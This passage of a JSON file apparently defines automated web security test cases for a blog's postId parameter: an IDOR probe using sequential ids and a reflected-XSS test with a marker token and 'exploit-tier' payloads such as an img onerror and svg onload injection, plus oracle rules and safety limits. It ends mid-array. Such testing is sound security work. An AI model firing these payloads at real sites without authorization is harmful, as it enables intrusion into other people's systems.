{
  "test_cases": [
    {
      "id": "TC-H001-idor-postId-baseline-probe",
      "hypothesis_id": "H001",
      "base_url": "https://{{host}}",
      "method": "GET",
      "endpoint": "/blog/post",
      "parameter": "postId",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "query.postId",
              "value": "3"
            }
          ],
          "description": "Baseline request using observed sample postId=3 to establish response code and length",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query.postId",
              "value": "4"
            },
            {
              "location": "query.postId",
              "value": "9999"
            }
          ],
          "description": "Probe with another valid-looking id and a high id to detect access control differences",
          "header": [
            {
              "header_name": "User-Agent",
              "header_value": "Mozilla/5.0 (compatible)"
            }
          ]
        },
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "query.postId",
              "value": "2"
            },
            {
              "location": "query.postId",
              "value": "1"
            }
          ],
          "description": "Additional id variants to confirm deterministic access differences across IDs",
          "header": [
            {
              "header_name": "User-Agent",
              "header_value": "Mozilla/5.0 (compatible)"
            }
          ]
        }
      ],
      "prerequisites": [],
      "oracle_rules": [
        {
          "signal": "status_code_change",
          "condition": "Compare HTTP status codes returned for baseline (postId=3) and probe/exploit ids. If any probe id returns an expected code different from baseline and within [200,401,403,404], flag as signal.",
          "threshold": {
            "expected_codes": [
              200,
              401,
              403,
              404
            ]
          },
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "Measure baseline body length for postId=3. If any probe/exploit id yields body length differing by >=40% (increase or decrease) and HTTP status is 200, flag as signal.",
          "threshold": {
            "body_length_delta_pct": 40.0,
            "expected_codes": [
              200
            ]
          },
          "weight": 0.8
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 10
      },
      "max_retries": 1,
      "delay_between_requests": 0.5,
      "notes": "Requests are read-only. Use same cookie session as observed. Host must be substituted in executor. User-Agent included to satisfy anti-automation.",
      "tags": [
        "idor",
        "baseline",
        "probe"
      ],
      "estimated_duration": 60
    },
    {
      "id": "TC-H002-xss-postId-reflection",
      "hypothesis_id": "H002",
      "base_url": "https://{{host}}",
      "method": "GET",
      "endpoint": "/blog/post",
      "parameter": "postId",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "query.postId",
              "value": "3"
            }
          ],
          "description": "Baseline to capture normal response body and code",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query.postId",
              "value": "INJECTION_TEST_TOKEN_abc123"
            },
            {
              "location": "query.postId",
              "value": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
            }
          ],
          "description": "Probe with a unique token to detect reflection and a safe-encoded script token (encoded) to detect naive reflection without executing JS",
          "encoding": "url",
          "header": [
            {
              "header_name": "User-Agent",
              "header_value": "Mozilla/5.0 (compatible)"
            }
          ]
        },
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "query.postId",
              "value": "<img src=x onerror=console.log('XSS')>"
            },
            {
              "location": "query.postId",
              "value": "\"><svg/onload=console.log('XSS')>"
            }
          ],
          "description": "Higher-risk payloads to confirm reflected XSS. Run only if probes indicate reflection and manual review allowed.",
          "header": [
            {
              "header_name": "User-Agent",
              "header_value": "Mozilla/5.0 (compatible)"
            }
          ]
        }
      ],
      "prerequisites": [],
      "oracle_rules": [
        {
          "signal": "reflected_input",
          "condition": "Search response body and headers for exact substring INJECTION_TEST_TOKEN_abc123 (case-sensitive) when returned with HTTP 200. If found unescaped in HTML or JSON, flag as reflection.",
          "threshold": {
            "expected_codes": [
              200
            ],
            "string_value": "INJECTION_TEST_TOKEN_abc123"
          },
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "Compare body length for baseline (postId=3) against probe with token. If length difference >=20% and probe returned 200, flag as anomaly.",
          "threshold": {
            "body_length_delta_pct": 20.0,
            "expected_codes": [
              200
            ]
          },
          "weight": 0.6
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 8
      },
      "max_retries": 1,
      "delay_between_requests": 0.5,
      "notes": "Exploit-tier payloads are potentially hazardous; only execute if probe-tier reflection confirmed and permitted. Use URL encoding for probe encoded payload.",
      "tags": [
        "xss",
        "reflected",
        "probe"
      ],
      "estimated_duration": 60
    },
    {
